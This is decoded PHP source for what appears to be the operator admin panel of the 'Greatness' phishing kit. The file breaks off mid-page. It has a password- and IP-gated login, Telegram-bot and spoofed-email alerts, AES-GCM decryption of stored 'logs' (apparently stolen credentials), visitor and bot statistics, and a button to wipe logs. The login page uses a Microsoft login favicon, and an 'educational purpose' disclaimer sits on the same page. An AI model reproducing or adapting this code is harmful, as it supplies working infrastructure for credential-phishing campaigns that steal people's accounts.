<?php

// Decoded By t.me/S4Moel
@ini_set("max_execution_time", "0");
session_start();
function oD8Mo($lRaST)
{
    try {
        $JnQgx = substr(hash("sha256", $lRaST), 2, 19);
        if (!$JnQgx) {
        }
        return $JnQgx;
    } catch (Exception $SAb92) {
        file_put_contents("login_err.txt", $SAb92);
        return "";
    }
}
error_reporting(E_ALL);
function K6RoE($wdB18, $rUUZj, $T7N_W = null)
{
    global $NHB5_, $yw_ib;
    if (!($wdB18 != null && $rUUZj != null)) {
        return;
    }
    $Z1Dwj = strlen(password_hash($rUUZj, $NHB5_));
    $wdB18 = $tKZKZ = substr($wdB18, $Z1Dwj);
    $wdB18 =
        $T7N_W == "hex"
            ? hex2bin($wdB18)
            : ($T7N_W == "base64"
                ? base64_decode($wdB18)
                : $wdB18);
    $wFTJl = substr($wdB18, 0, 16);
    $mtXnL = hash_pbkdf2("sha512", $rUUZj . $rUUZj, $wFTJl, 40000, 64, true);
    $IBDw8 = openssl_cipher_iv_length("aes-256-gcm");
    $c6VqE = substr($wdB18, 16, $IBDw8);
    $w42Bn = substr($wdB18, -16);
    return openssl_decrypt(
        substr($wdB18, 16 + $IBDw8, -16),
        "aes-256-gcm",
        $mtXnL,
        $yw_ib,
        $c6VqE,
        $w42Bn
    );
}
class RIokG
{
    public function WnicY($Vambr)
    {
        if (!($this->Kp7xF($Vambr) == "")) {
            goto NY1wg;
        }
        $this->KP7xF($Vambr);
        NY1wg:
    }
    public function save($hjlFS, $AHlf5)
    {
        file_put_contents("/var/www/html/" . $AHlf5, $hjlFS, FILE_APPEND);
    }
    public function kp7xf($Vambr)
    {
        $aJJ1C = curl_init();
        curl_setopt($aJJ1C, CURLOPT_URL, $Vambr);
        curl_setopt($aJJ1C, CURLOPT_RETURNTRANSFER, 1);
        $KQ0vh = curl_exec($aJJ1C);
        $DRsuq = curl_getinfo($aJJ1C, CURLINFO_HTTP_CODE);
        if ($DRsuq == 200) {
            return $KQ0vh;
        }
        file_put_contents("../error_log.txt", "Invalid Token\n", FILE_APPEND);
        return $KQ0vh;
    }
    public function rBP1x($faMlE, $YFNz5)
    {
        $i0p3p = "++++Office Email From Greatness+++++";
        $nmycm =
            "Content-type: text/html; charset=UTF-8\r\nFrom: Greatness <ghost@greatness.com>\r\n";
        @mail($faMlE, $i0p3p, $YFNz5, $nmycm);
    }
    public function send($hjlFS, $KOEgS, $Qsxsb, $lXpgm, $AHlf5)
    {
        $jbk8o = ["chat_id" => $Qsxsb, "text" => $hjlFS];
        $Vambr =
            "https://api.telegram.org/bot" . str_replace("bot", "", $KOEgS);
        $mZpae =
            $Vambr .
            "/sendMessage?" .
            str_replace("?", "", http_build_query($jbk8o));
        $this->WnIcy($mZpae);
    }
}
$jbk8o = parse_ini_file("../files/config.ini");
$sB9ej = $_SERVER["REMOTE_ADDR"];
if (!$jbk8o["ip"]) {
    goto TeJqC;
}
if (!(Od8mo($_SERVER["REMOTE_ADDR"]) != $jbk8o["ip"])) {
    TeJqC:
    if (!isset($_POST["logout"])) {
        function rwOQD()
        {
            $lCa40 = "Unknown OS";
            $bwgCR = [
                "/windows nt 10/i" => "Windows 10",
                "/windows nt 6.3/i" => "Windows 8.1",
                "/windows nt 6.2/i" => "Windows 8",
                "/windows nt 6.1/i" => "Windows 7",
                "/windows nt 6.0/i" => "Windows Vista",
                "/windows nt 5.2/i" => "Windows Server 2003/XP x64",
                "/windows nt 5.1/i" => "Windows XP",
                "/windows xp/i" => "Windows XP",
                "/windows nt 5.0/i" => "Windows 2000",
                "/windows me/i" => "Windows ME",
                "/win98/i" => "Windows 98",
                "/win95/i" => "Windows 95",
                "/win16/i" => "Windows 3.11",
                "/macintosh|mac os x/i" => "Mac OS X",
                "/mac_powerpc/i" => "Mac OS 9",
                "/linux/i" => "Linux",
                "/ubuntu/i" => "Ubuntu",
                "/iphone/i" => "iPhone",
                "/ipod/i" => "iPod",
                "/ipad/i" => "iPad",
                "/android/i" => "Android",
                "/blackberry/i" => "BlackBerry",
                "/webos/i" => "Mobile",
            ];
            foreach ($bwgCR as $BOUhU => $VfdN6) {
                if (!preg_match($BOUhU, $_SERVER["HTTP_USER_AGENT"])) {
                    goto XaXUf;
                }
                $lCa40 = $VfdN6;
                XaXUf:
            }
            return $lCa40;
        }
        function mLWwo()
        {
            $JxAVc = "Unknown Browser";
            $bwgCR = [
                "/msie/i" => "Internet Explorer",
                "/firefox/i" => "Firefox",
                "/safari/i" => "Safari",
                "/chrome/i" => "Chrome",
                "/edge/i" => "Edge",
                "/opera/i" => "Opera",
                "/netscape/i" => "Netscape",
                "/maxthon/i" => "Maxthon",
                "/konqueror/i" => "Konqueror",
                "/mobile/i" => "Handheld Browser",
            ];
            foreach ($bwgCR as $BOUhU => $VfdN6) {
                if (!preg_match($BOUhU, $_SERVER["HTTP_USER_AGENT"])) {
                    goto VJ4b7;
                }
                $JxAVc = $VfdN6;
                VJ4b7:
            }
            return $JxAVc;
        }
        if (!isset($_POST["password"])) {
            goto EJafZ;
        }
        if (OD8MO($_POST["password"]) == $jbk8o["password"]) {
            $_SESSION["logged"] = $jbk8o["password"];
            if (!($jbk8o["password"] == "f615d5bcaac778352a8")) {
                goto stx2B;
            }
            $RUuIL =
                "<script>alert(\"You're using the default password, Please Change it to avoid panel intrusion\");</script>";
            stx2B:
            if (!$jbk8o["ip"]) {
                goto WQFku;
            }
            if (!(Od8mO($_SERVER["REMOTE_ADDR"]) != $jbk8o["ip"])) {
                WQFku:
                $R3PnE = sprintf(
                    "New Visitor Logged Into Your Admin Panel \r\nIP :%s\r\nBrowser: %s\r\nMachine: %s\r\nIf this was not you please take neccesarry actions like clearing your logs and changing your panel.\r\n====GREATNESS======",
                    $_SERVER["REMOTE_ADDR"],
                    Mlwwo(),
                    rwOQd()
                );
                $EdNpb = new RIOkG();
                $EdNpb->send(
                    $R3PnE,
                    $jbk8o["bot"],
                    $jbk8o["chat"],
                    $jbk8o["email"],
                    "visits.txt"
                );
                goto FUu8u;
            }
            echo "<h1>Ip Restriction come back later</h1>";
            exit(0);
        }
        $FjvSn = "<h3 class=\"text-danger\">Sorry, Can't Log You In </h3>";
        FUu8u:
        EJafZ:
        if (!$jbk8o["ip"]) {
            goto symCR;
        }
        if (!(od8mo($_SERVER["REMOTE_ADDR"]) != $jbk8o["ip"])) {
            symCR:
            if (!isset($_SESSION["logged"])) {
                goto im7BP;
            }
            if (!($_SESSION["logged"] != $jbk8o["password"])) {
                goto jQhJz;
            }
            unset($_SESSION["logged"]);
            jQhJz:
            im7BP:
            if (!isset($_SESSION["logged"])) {
                $mZpae = $FjvSn ?? "";
                $Vt0EM =
                    "<html>\r\n<head>\r\n<script src=\"https://code.jquery.com/jquery-3.2.1.slim.min.js\" integrity=\"sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN\" crossorigin=\"anonymous\"></script>\r\n<script src=\"https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js\" integrity=\"sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q\" crossorigin=\"anonymous\"></script>\r\n<link rel=\"stylesheet\" href=\"https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css\" integrity=\"sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm\" crossorigin=\"anonymous\">\r\n<script src=\"https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js\" integrity=\"sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl\" crossorigin=\"anonymous\"></script>\r\n<link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css\" rel=\"stylesheet\" integrity=\"sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC\" crossorigin=\"anonymous\">\r\n<script src=\"https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js\" integrity=\"sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM\" crossorigin=\"anonymous\"></script>\r\n<style>\r\nbody {\r\nbackground-color:black;;\r\noverflow:hidden;\r\n}\r\n.typewriter{\r\n  overflow: hidden; /* Ensures the content is not revealed until the animation */\r\n  border-right: .15em solid orange; /* The typwriter cursor */\r\n  background-color: rgb(24, 2, 2);\r\n  white-space: nowrap; /* Keeps the content on a single line */\r\n  margin: 0 auto; /* Gives that scrolling effect as the typing happens */\r\n  letter-spacing: .15em; /* Adjust as needed */\r\n  animation: \r\n    typing 3.5s steps(40, end),\r\n    blink-caret .75s step-end infinite;\r\n}\r\n\r\n/* The typing effect */\r\n@keyframes typing {\r\n  from { width: 0 }\r\n  to { width: 100% }\r\n}\r\n\r\n/* The typewriter cursor effect */\r\n@keyframes blink-caret {\r\n  from, to { border-color: transparent }\r\n  50% { border-color: orange; }\r\n}\r\n\r\ncontain {\r\n\tperspective: 500px;\t\r\n\tdisplay: flex;\r\n\tjustify-content: center;\r\n\talign-items: center;\r\n\theight: 100vh;\r\n}\r\n\r\nimg {\r\n  height: 4rem;\r\n\tbackground: grey;\r\n\ttransform: rotateY(90deg);\r\n\tanimation: rotateAnimation 3s linear infinite;\r\n}\r\n\r\n@keyframes rotateAnimation {\r\n\tfrom {transform: rotateY(45deg);}\r\n\tto {transform: rotateY(225deg);}\r\n}\r\n</style>\r\n</head>\r\n<body>\r\n<section class=\"vh-100 gradient-custom\">\r\n  <div class=\"container py-5 h-100\">\r\n    <div class=\"row d-flex justify-content-center align-items-center h-100\">\r\n      <div class=\"col-12 col-md-8 col-lg-6 col-xl-5\">\r\n        <div class=\"card bg-dark text-white\" style=\"border-radius: 1rem;\">\r\n          <div class=\"card-body p-5 text-center\">\r\n            <div class=\"contain\">\r\n              <img src=\"https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico\"></img>\r\n            </div>\r\n            <div class=\"mb-md-5 mt-md-4 pb-5\">\r\n              <br>\r\n              <h2 class=\"fw-bold mb-2 text-uppercase\">Admin Panel </h2>\r\n              <p class=\"text-white-50 mb-5 typewriter\">Welcome Back " .
                    $jbk8o["name"] .
                    "</p>\r\n\r\n              <div class=\"form-outline form-white mb-4\">\r\n\t\t\t\t\t" .
                    $mZpae .
                    "\r\n              </div>\r\n                <form method=\"POST\">\r\n                  <div class=\"form-outline form-white mb-4\">\r\n                    <input type=\"password\" name=\"password\" placeholder=\"Please input your password\" id=\"typePasswordX\" class=\"form-control form-control-lg\" />\r\n                   <label class=\"form-label\" for=\"typePasswordX\"></label>\r\n                 </div>\r\n                 <div class=\"form-check form-switch\">\r\n                  <input class=\"form-check-input\" title=\"Please chdck this box\" type=\"checkbox\" id=\"flexSwitchCheckDefault\" onchange=\"document.getElementById('agree').disabled = !this.checked;\">\r\n                  <label class=\"form-check-label\" for=\"flexSwitchCheckDefault\">I Agree to the terms and service.</label>\r\n                </div>\r\n                <br>\r\n              <button class=\"btn btn-success btn-outline-light btn-lg px-5 \" id=\"agree\" type=\"submit\" disabled>Login</button>\r\n                 </form>\r\n                 <h3 class=\"text-primary\">\r\n                  <a class=\"typewrite\" data-period=\"2000\" data-type='[ \"Disclamer!\", \"This Page Is Only For Educational Purpose.\", \"And for learning purposes too\",\"Im not responsible for any damage caused by this page\", \"GREATNESS.\" ]'>\r\n                    <span class=\"wrap\"></span>\r\n                  </a>\r\n                </h3>\r\n            </div>\r\n          </div>\r\n        </div>\r\n      </div>\r\n    </div>\r\n  </div>\r\n</section>\r\n<script>\r\n  var TxtType = function(el, toRotate, period) {\r\n        this.toRotate = toRotate;\r\n        this.el = el;\r\n        this.loopNum = 0;\r\n        this.period = parseInt(period, 10) || 2000;\r\n        this.txt = '';\r\n        this.tick();\r\n        this.isDeleting = false;\r\n    };\r\n\r\n    TxtType.prototype.tick = function() {\r\n        var i = this.loopNum % this.toRotate.length;\r\n        var fullTxt = this.toRotate[i];\r\n\r\n        if (this.isDeleting) {\r\n        this.txt = fullTxt.substring(0, this.txt.length - 1);\r\n        } else {\r\n        this.txt = fullTxt.substring(0, this.txt.length + 1);\r\n        }\r\n\r\n        this.el.innerHTML = '<span class=\"wrap\">'+this.txt+'</span>';\r\n\r\n        var that = this;\r\n        var delta = 200 - Math.random() * 100;\r\n\r\n        if (this.isDeleting) { delta /= 2; }\r\n\r\n        if (!this.isDeleting && this.txt === fullTxt) {\r\n        delta = this.period;\r\n        this.isDeleting = true;\r\n        } else if (this.isDeleting && this.txt === '') {\r\n        this.isDeleting = false;\r\n        this.loopNum++;\r\n        delta = 500;\r\n        }\r\n\r\n        setTimeout(function() {\r\n        that.tick();\r\n        }, delta);\r\n    };\r\n\r\n    window.onload = function() {\r\n        var elements = document.getElementsByClassName('typewrite');\r\n        for (var i=0; i<elements.length; i++) {\r\n            var toRotate = elements[i].getAttribute('data-type');\r\n            var period = elements[i].getAttribute('data-period');\r\n            if (toRotate) {\r\n              new TxtType(elements[i], JSON.parse(toRotate), period);\r\n            }\r\n        }\r\n        // INJECT CSS\r\n        var css = document.createElement(\"style\");\r\n        css.type = \"text/css\";\r\n        css.innerHTML = \".typewrite > .wrap { border-right: 0.08em solid #fff}\";\r\n        document.body.appendChild(css);\r\n    };\r\n</script>\r\n</body>\r\n</html>";
                echo $Vt0EM;
                exit();
            }
            if (isset($_SESSION["logged"])) {
                if (!($_SESSION["logged"] == $jbk8o["password"])) {
                    goto NPrYp;
                }
                if (!$jbk8o["ip"]) {
                    goto bf0Oe;
                }
                if (!(od8MO($_SERVER["REMOTE_ADDR"]) != $jbk8o["ip"])) {
                    bf0Oe:
                    $NHB5_ = PASSWORD_DEFAULT;
                    $yw_ib = OPENSSL_RAW_DATA;
                    function SZ8B6($EZjwI)
                    {
                        global $jbk8o;
                        $KPx7u = file_get_contents($EZjwI);
                        $ErUJ4 = explode(PHP_EOL, $KPx7u);
                        $tcaHo = "";
                        foreach ($ErUJ4 as $P1cBn) {
                            $tcaHo .=
                                K6RoE($P1cBn, $jbk8o["password"], "hex") .
                                PHP_EOL;
                        }
                        return $tcaHo;
                    }
                    if (!$jbk8o["ip"]) {
                        goto VD3El;
                    }
                    if (!(OD8MO($_SERVER["REMOTE_ADDR"]) != $jbk8o["ip"])) {
                        VD3El:
                        if (!isset($_POST["clear"])) {
                            goto C6on_;
                        }
                        if (
                            !(
                                file_exists("logs.json") &&
                                file_exists("log.json")
                            )
                        ) {
                            goto jgq8D;
                        }
                        unlink("logs.json");
                        unlink("log.json");
                        jgq8D:
                        if (!file_exists("error.log")) {
                            goto H3_03;
                        }
                        @unlink("error.log");
                        H3_03:
                        C6on_:
                        NPrYp:
                        RZjr5:
                        if (!$jbk8o["ip"]) {
                            goto wm1kj;
                        }
                        if (!(OD8Mo($_SERVER["REMOTE_ADDR"]) != $jbk8o["ip"])) {
                            wm1kj:
                            echo "<!DOCTYPE html>\r\n<html dir=\"ltr\" lang=\"en\">\r\n  <head>\r\n    <meta charset=\"utf-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <!-- Tell the browser to be responsive to screen width -->\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\" />\r\n\t\t<style>\r\n\tbody, html {width: 100%;}\r\n\t.d-tab, .full-width-td {\r\n\t\twidth: 100%;\r\n\t}\r\n\t.full-width-tr {\r\n      display: flex;\r\n      flex-wrap: wrap;\r\n    }\r\n    \r\n    .full-width-td {\r\n      width: 100%;\r\n    }\r\n\t.full-width-td {display:block; box-sizing:border-box; clear:both}\r\n\t.app-search .form-control {\r\n border:none;\r\n font-size:13px;\r\n color:#4c5667;\r\n padding-left:20px;\r\n padding-right:40px;\r\n background:rgba(232, 216, 216, 0.9);\r\n -webkit-box-shadow:none;\r\n /*! box-shadow:none; */height:30px;\r\n font-weight:600;\r\n width:180px;\r\n display:inline-block;\r\n line-height:30px;\r\n margin-top:15px;\r\n border-radius:40px;\r\n -webkit-transition:0.5s ease-out;\r\n transition:0.5s ease-out\r\n}\r\n.app-search .form-control:focus {\r\n width:300px\r\n}\r\n.navbar-nav .app-search {\r\n position:relative;\r\n margin:0\r\n}\r\n.navbar-nav .app-search a {\r\n position:absolute;\r\n top:5px;\r\n right:10px;\r\n color:#4c5667\r\n}\r\n\t</style>\r\n\t<link rel=\"stylesheet\" href=\"https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css\" integrity=\"sha512-1sCRPdkRXhBV2PBLUdRb4tMg1w2YPf37qatUFeS7zlBy7jJI8Lf4VHwWfZZfpXtYSLy85pkm9GaYVYMfw5BC1A==\" crossorigin=\"anonymous\" referrerpolicy=\"no-referrer\" />\r\n    <meta\r\n      name=\"keywords\"\r\n      content=\"wrappixel, admin dashboard, html css dashboard, web dashboard, bootstrap 5 admin, bootstrap 5, css3 dashboard, bootstrap 5 dashboard, Ample lite admin bootstrap 5 dashboard, frontend, responsive bootstrap 5 admin template, Ample admin lite dashboard bootstrap 5 dashboard template\"\r\n    />\r\n    <meta\r\n      name=\"description\"\r\n      content=\"Ample Admin Lite is powerful and clean admin dashboard template, inpired from Bootstrap Framework\"\r\n    />\r\n    <meta name=\"robots\" content=\"noindex,nofollow\" />\r\n    <title>Admin Panel</title>\r\n    <link\r\n      rel=\"canonical\"\r\n      href=\"https://www.wrappixel.com/templates/ample-admin-lite/\"\r\n    />\r\n    <!-- Favicon icon -->\r\n    <link\r\n      rel=\"icon\"\r\n      type=\"image/png\"\r\n      sizes=\"16x16\"\r\n      href=\"assets/favicon.png\"\r\n    />\r\n    <!-- Custom CSS -->\r\n    <link\r\n      href=\"assets/chartist.min.css\"\r\n      rel=\"stylesheet\"\r\n    />\r\n    <link\r\n      rel=\"stylesheet\"\r\n      href=\"assets/chartist-plugin-tooltip.css\"\r\n    />\r\n    <!-- Custom CSS -->\r\n    <link href=\"assets/style.min.css\" rel=\"stylesheet\" />\r\n   <script src=\"https://code.jquery.com/jquery-3.6.0.min.js\" integrity=\"sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=\" crossorigin=\"anonymous\"></script>\r\n   <script src=\"https://cdnjs.cloudflare.com/ajax/libs/Chart.js/2.9.4/Chart.js\"></script>\r\n   <script src=\"https://www.gstatic.com/charts/loader.js\"></script>\r\n\r\n    <script src=\"js/jqr.js\"></script>\r\n  </head>\r\n\r\n  <body>\r\n    <!-- ============================================================== -->\r\n    <!-- Preloader - style you can find in spinners.css -->\r\n    <!-- ============================================================== -->\r\n    <div class=\"preloader\">\r\n      <div class=\"lds-ripple\">\r\n        <div class=\"lds-pos\"></div>\r\n        <div class=\"lds-pos\"></div>\r\n      </div>\r\n    </div>\r\n    <!-- ============================================================== -->\r\n    <!-- Main wrapper - style you can find in pages.scss -->\r\n    <!-- ============================================================== -->\r\n\t";
                            echo $RUuIL ?? "";
                            echo "    <div\r\n      id=\"main-wrapper\"\r\n      data-layout=\"vertical\"\r\n      data-navbarbg=\"skin5\"\r\n      data-sidebartype=\"full\"\r\n      data-sidebar-position=\"absolute\"\r\n      data-header-position=\"absolute\"\r\n      data-boxed-layout=\"full\"\r\n    >\r\n\t\r\n      <!-- ============================================================== -->\r\n      <!-- Topbar header - style you can find in pages.scss -->\r\n      <!-- ============================================================== -->\r\n      <header class=\"topbar\" data-navbarbg=\"skin5\">\r\n        <nav class=\"navbar top-navbar navbar-expand-md navbar-dark\">\r\n          <div class=\"navbar-header\" data-logobg=\"skin6\">\r\n            <!-- ============================================================== -->\r\n            <!-- Logo -->\r\n            <!-- ============================================================== -->\r\n            <a class=\"navbar-brand\" href=\"index.php\">\r\n              <!-- Logo icon -->\r\n              <b class=\"logo-icon\">\r\n                <!-- Dark Logo icon -->\r\n                <img src=\"assets/logo-icon.png\" alt=\"homepage\" />\r\n              </b>\r\n              <!--End Logo icon -->\r\n              <!-- Logo text -->\r\n              <span class=\"logo-text\">\r\n                <!-- dark Logo text -->\r\n                <img src=\"assets/logo-text.png\" alt=\"homepage\" />\r\n              </span>\r\n            </a>\r\n            <!-- ============================================================== -->\r\n            <!-- End Logo -->\r\n            <!-- ============================================================== -->\r\n            <!-- ============================================================== -->\r\n            <!-- toggle and nav items -->\r\n            <!-- ============================================================== -->\r\n            <a\r\n              class=\"nav-toggler waves-effect waves-light text-dark d-block d-md-none\"\r\n              href=\"javascript:void(0)\"\r\n            >\r\n              <i class=\"ti-menu ti-close\"></i>\r\n            </a>\r\n          </div>\r\n          <!-- ============================================================== -->\r\n          <!-- End Logo -->\r\n          <!-- ============================================================== -->\r\n\t\t <div style=\"position:sticky;top:0;margin-left:auto;margin-right:auto;width:100%;\">\r\n\t\t\t";
                            $Vambr =
                                "https://" .
                                $_SERVER["HTTP_HOST"] .
                                "" .
                                str_replace(
                                    "/admin",
                                    "",
                                    dirname($_SERVER["PHP_SELF"])
                                ) .
                                "/files/config.ini";
                            $cAXAA = @get_headers($Vambr);
                            if (!is_array($cAXAA)) {
                                goto rjM6h;
                            }
                            $CSKzG = stripos($cAXAA[0], "403");
                            rjM6h:
                            echo "\t\t\t<span style=\"color:red;";
                            echo $cAXAA != false
                                ? ((bool) ($CSKzG ?? "")
                                    ? "display:none;"
                                    : "")
                                : "";
                            echo "\">\r\n\t\t\t\tNOTICE:\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0\xc2\xa0Your admin panel is not secure!  [Your logs can get stolen]\r\n\t\t\t</span>\r\n\t\t </div>\r\n          <div\r\n            class=\"navbar-collapse collapse\"\r\n            id=\"navbarSupportedContent\"\r\n            data-navbarbg=\"skin5\"\r\n          >\r\n            <!-- ============================================================== -->\r\n            <!-- Right side toggle and nav items -->\r\n            <!-- ============================================================== -->\r\n            <ul class=\"navbar-nav ms-auto d-flex align-items-center\">\r\n              <!-- ============================================================== -->\r\n              <!-- Search -->\r\n              <!-- ============================================================== -->\r\n              <li class=\"in\">\r\n               \r\n              </li>\r\n              <!-- ============================================================== -->\r\n              <!-- User profile and search -->\r\n              <!-- ============================================================== -->\r\n              <li>\r\n                <a class=\"profile-pic\" href=\"#\">\r\n                  <img\r\n                    src=\"https://aadcdn.msftauth.net/ests/2.1/content/images/favicon_a_eupayfgghqiai7k9sol6lg2.ico\"\r\n                    alt=\"user-img\"\r\n                    width=\"36\"\r\n                    class=\"img-circle\"\r\n                  />\r\n                  <span class=\"text-white font-medium\">";
                            printf("%s Panel", $jbk8o["name"]);
                            echo "</span>\r\n                </a>\r\n              </li>\r\n              <!-- ============================================================== -->\r\n              <!-- User profile and search -->\r\n              <!-- ============================================================== -->\r\n            </ul>\r\n          </div>\r\n        </nav>\r\n      </header>\r\n      <!-- ============================================================== -->\r\n      <!-- End Topbar header -->\r\n      <!-- ============================================================== -->\r\n      <!-- ============================================================== -->\r\n      <!-- Left Sidebar - style you can find in sidebar.scss  -->\r\n      <!-- ============================================================== -->\r\n      <aside class=\"left-sidebar\" data-sidebarbg=\"skin6\">\r\n        <!-- Sidebar scroll-->\r\n        <div class=\"scroll-sidebar\">\r\n          <!-- Sidebar navigation-->\r\n          <nav class=\"sidebar-nav\">\r\n            <ul id=\"sidebarnav\">\r\n              <!-- User Profile-->\r\n              <li class=\"sidebar-item pt-2\">\r\n                <a\r\n                  class=\"sidebar-link waves-effect waves-dark sidebar-link\"\r\n                  href=\"index.php\"\r\n                  aria-expanded=\"false\"\r\n                >\r\n                  <i class=\"far fa-clock\" aria-hidden=\"true\"></i>\r\n                  <span class=\"hide-menu\">Dashboard</span>\r\n                </a>\r\n              </li>\r\n              <li class=\"sidebar-item\">\r\n                <a\r\n                  class=\"sidebar-link waves-effect waves-dark sidebar-link\"\r\n                  href=\"profile.php\"\r\n                  aria-expanded=\"false\"\r\n                >\r\n                  <i class=\"fa fa-user\" aria-hidden=\"true\"></i>\r\n                  <span class=\"hide-menu\">Settings</span>\r\n                </a>\r\n              </li>\r\n              <li class=\"sidebar-item\">\r\n                <a\r\n                  class=\"sidebar-link waves-effect waves-dark sidebar-link\"\r\n                  href=\"blank.php\"\r\n                  aria-expanded=\"false\"\r\n                >\r\n                  <i class=\"fa fa-table\" aria-hidden=\"true\"></i>\r\n                  <span class=\"hide-menu\">Oth</span>\r\n                </a>\r\n              </li>\r\n            </ul>\r\n          </nav>\r\n          <!-- End Sidebar navigation -->\r\n        </div>\r\n        <!-- End Sidebar scroll-->\r\n      </aside>\r\n      <!-- ============================================================== -->\r\n      <!-- End Left Sidebar - style you can find in sidebar.scss  -->\r\n      <!-- ============================================================== -->\r\n      <!-- ============================================================== -->\r\n      <!-- Page wrapper  -->\r\n      <!-- ============================================================== -->\r\n      <div class=\"page-wrapper\">\r\n        <!-- ============================================================== -->\r\n        <!-- Bread crumb and right sidebar toggle -->\r\n        <!-- ============================================================== -->\r\n        <div class=\"page-breadcrumb bg-white\">\r\n          <div class=\"row align-items-center\">\r\n            <div class=\"col-lg-3 col-md-4 col-sm-4 col-xs-12\">\r\n              <h4 class=\"page-title\">Dashboard</h4>\r\n            </div>\r\n            <div class=\"col-lg-9 col-sm-8 col-md-8 col-xs-12\">\r\n              <div class=\"d-md-flex\">\r\n                <ol class=\"breadcrumb ms-auto\">\r\n\t\t\t\t<form method=\"POST\" action=\"index.php\" onsubmit=\"if (!confirm('Are you sure you want to clear your logs?')) return false;\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"clear\" value=\"all\"></input>\r\n                  <li><button class=\"btn btn-danger\" type=\"submit\">Reset Log's and Visit's</button></li>\r\n\t\t\t\t </form>\r\n\t\t\t\t <form method=\"POST\" action=\"index.php\">\r\n\t\t\t\t\t<input type=\"hidden\" name=\"logout\" value=\"all\"></input>\r\n                  <li><button class=\"btn btn-danger mx-3\" type=\"submit\">Log Out</button></li>\r\n\t\t\t\t </form>\r\n                </ol>\r\n                  \r\n                </a>\r\n              </div>\r\n            </div>\r\n          </div>\r\n          <!-- /.col-lg-12 -->\r\n        </div>\r\n        <!-- ============================================================== -->\r\n        <!-- End Bread crumb and right sidebar toggle -->\r\n        <!-- ============================================================== -->\r\n        <!-- ============================================================== -->\r\n        <!-- Container fluid  -->\r\n        <!-- ============================================================== -->\r\n        <div class=\"container-fluid\">\r\n          <!-- ============================================================== -->\r\n          <!-- Three charts -->\r\n          <!-- ============================================================== -->\r\n          <div class=\"row justify-content-center\">\r\n\t\t\t<div class=\"col-lg-5 col-md-15\">\r\n              <div class=\"white-box analytics-info\">\r\n                <h3 class=\"box-title\">Total Visits  [<span class=\"visit-count\"></span>]</h3>\r\n\t\t\t\t<div class=\"chart-holder\">\r\n\t\t\t\t\t<canvas id=\"myChart\" style=\"width:80%;max-width:600px\"></canvas>\r\n\t\t\t\t\t";
                            if (file_exists("log.json") == true) {
                                $b_wC1 = explode(
                                    PHP_EOL,
                                    file_get_contents("log.json")
                                );
                                $buKD3 = 0;
                                $QZTY4 = 0;
                                $iM6bM = [];
                                $Vhu7c = [];
                                foreach ($b_wC1 as $nzgNb => $XWc1p) {
                                    if ($XWc1p) {
                                        $RDfIL = json_decode($XWc1p, 1)["bot"];
                                        $lEwtN = json_decode($XWc1p, 1)[
                                            "country"
                                        ];
                                        $lEwtN = $lEwtN != "" ? $lEwtN : "None";
                                        if (!in_array($lEwtN, $iM6bM)) {
                                            $iM6bM[] = $lEwtN;
                                            $Vhu7c[] = 1;
                                            goto UrC5i;
                                        }
                                        $lRaST = array_search($lEwtN, $iM6bM);
                                        $Vhu7c[$lRaST]++;
                                        UrC5i:
                                        switch ($RDfIL) {
                                            case 0:
                                                $buKD3++;
                                                goto KTRuk;
                                            case 1:
                                                $QZTY4++;
                                                goto KTRuk;
                                            default:
                                                goto KTRuk;
                                        }
                                        KTRuk:
                                        goto I629s;
                                    }
                                    I629s:
                                }
                                goto GxcXa;
                            }
                            $buKD3 = 0;
                            $QZTY4 = 0;
                            GxcXa:
                            echo "\t\t\t\t\t<script>\r\n\t\t\t\t\tvar visit = ";
                            echo $buKD3;
                            echo ";\r\n\t\t\t\t\tvar bot = ";
                            echo $QZTY4;
